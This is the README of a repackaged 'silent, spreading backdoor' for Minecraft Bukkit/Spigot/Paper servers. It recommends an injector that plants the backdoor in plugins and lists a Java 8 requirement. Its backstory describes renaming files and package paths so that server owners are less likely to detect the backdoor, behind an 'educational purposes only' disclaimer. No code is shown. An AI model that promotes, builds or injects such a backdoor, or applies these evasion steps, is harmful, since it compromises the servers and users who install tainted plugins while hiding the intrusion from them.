# Thicc Industries' Minecraft Backdoor - REMSATERED

A silent, spreading backdoor for Minecraft Bukkit/Spigot/Paper servers.
Using the injector is recommended, should you choose to manually backdoor a plugin, you're on your own if you run into problems.

For educational purposes only. Do not use on a server you do not own.

## Backstory
I changed parts of this sofware because it was easy to detect you could look for the path ``com.thiccindustries.debugger`` and you would find files like ``Injector`` that normal pulgins dont have so i have renamed some of the files and the paths to make it less likly that someone will find it. This sofwtare completely belongs to them and i am not saying i made this because i didnt i renamed some files and the paths.

## Requirements:
### Injector:
* Java 8 runtime.
